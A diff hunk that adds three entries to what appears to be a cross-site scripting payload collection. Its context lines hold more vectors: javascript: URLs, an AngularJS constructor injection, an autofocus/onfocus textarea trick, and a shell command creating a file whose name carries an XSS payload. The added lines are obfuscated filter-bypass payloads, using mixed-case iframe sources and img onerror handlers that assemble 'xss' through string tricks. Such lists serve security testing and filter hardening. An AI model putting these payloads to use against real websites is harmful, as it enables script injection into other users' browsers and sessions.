@@ -168,6 +168,9 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 <IFRAME SRC="javascript​:alert('hacked');"></IFRAME>
 <div ng-app> <strong class="ng-init:constructor.constructor('alert('hacked')')()">aaa</strong> </div>
 <<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //
+''"><script>(1)</script><iFrAme/src=jaVascRipt:prompt.valueOf()(1)+class=spider></iFramE>
+<img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
+<img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
 
 # Create file whith payload XSS.
 touch '"><img src=x onerror=alert("xss!")>.pdf'
